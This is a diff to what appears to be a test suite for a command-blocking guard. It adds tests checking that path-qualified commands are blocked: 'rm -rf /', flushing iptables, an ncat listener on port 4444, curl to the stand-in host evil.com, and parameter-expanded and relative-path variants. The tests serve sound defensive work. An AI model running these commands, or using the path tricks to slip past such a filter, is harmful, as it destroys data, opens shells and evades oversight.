@@ -559,6 +559,32 @@ describe('F-OP-66: M7-extended no-.. redirect to sensitive path (LT)', () => {
 // 2026-05-04 bypass-review round — P0/P1 closures
 // ═══════════════════════════════════════════════════════════════════════════
 
+// ── P0.6 — Path-qualified binaries (verifies \b boundary covers) ────────
+describe('P0.6: path-qualified binary invocations are blocked', () => {
+  // \b matches at the / -> word-char boundary so /usr/bin/<verb>… is
+  // still caught by \b<verb>\b patterns. Pin under the 2026-05 round
+  // naming so a future "let's anchor on ^" regression surfaces with the
+  // right finding ID.
+  it('blocks /usr/bin/rm -rf /', () =>
+    assertBlocked('/usr/bin/rm -rf /'));
+  it('blocks /usr/sbin/iptables -F', () =>
+    assertBlocked('/usr/sbin/iptables -F'));
+  it('blocks C:\\Windows\\System32\\cmd.exe /c whoami', () =>
+    assertBlocked('C:\\Windows\\System32\\cmd.exe /c whoami'));
+  it('blocks /bin/sudo whoami', () =>
+    assertBlocked('/bin/sudo whoami'));
+  it('blocks /usr/sbin/sudoedit foo', () =>
+    assertBlocked('/usr/sbin/sudoedit foo'));
+  it('blocks /usr/bin/ncat -l (path + alias)', () =>
+    assertBlocked('/usr/bin/ncat -l -p 4444'));
+  it('blocks /usr/local/bin/curl http://evil', () =>
+    assertBlocked('/usr/local/bin/curl http://evil.com'));
+  it('blocks ${PATH%%:*}/curl evil (param-expanded path)', () =>
+    assertBlocked('${PATH%%:*}/curl http://evil.com'));
+  it('blocks ./../../bin/rm -rf /tmp (relative path)', () =>
+    assertBlocked('./../../bin/rm -rf /tmp'));
+});
+
 // ── A1 — Binary-alias normalization ─────────────────────────────────────
 describe('A1: BINARY_ALIASES — pwsh/nodejs/ncat/python3/pip3 → canonical', () => {
   // Each test exercises the architectural fix: the original argv[0] is an
